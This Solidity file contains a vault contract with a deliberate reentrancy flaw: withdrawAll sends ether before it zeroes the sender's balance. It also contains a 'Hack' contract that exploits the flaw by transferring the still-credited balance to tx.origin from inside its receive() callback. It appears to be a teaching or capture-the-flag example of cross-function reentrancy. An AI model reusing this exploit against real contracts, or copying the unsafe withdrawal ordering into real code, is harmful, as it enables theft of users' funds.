//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Vault {
    mapping(address=>uint) public balances;

    function deposit() public payable {
        balances[msg.sender]+=msg.value;
    }

    function withdrawAll() public payable {
        require(balances[msg.sender]>0,"nothing to withdraw");
        (bool sent,) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "call failed");
        balances[msg.sender]=0;
    }

    function transferFromBalance(address to, uint amount) public {
        require(balances[msg.sender]>=amount, "not enough money");
        balances[msg.sender]-=amount;
        balances[to]+=amount;
    }
}

contract Hack {
    Vault vault;
    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdrawAll();
    }

    receive() external payable {
        vault.transferFromBalance(tx.origin, 1 ether);
    }
}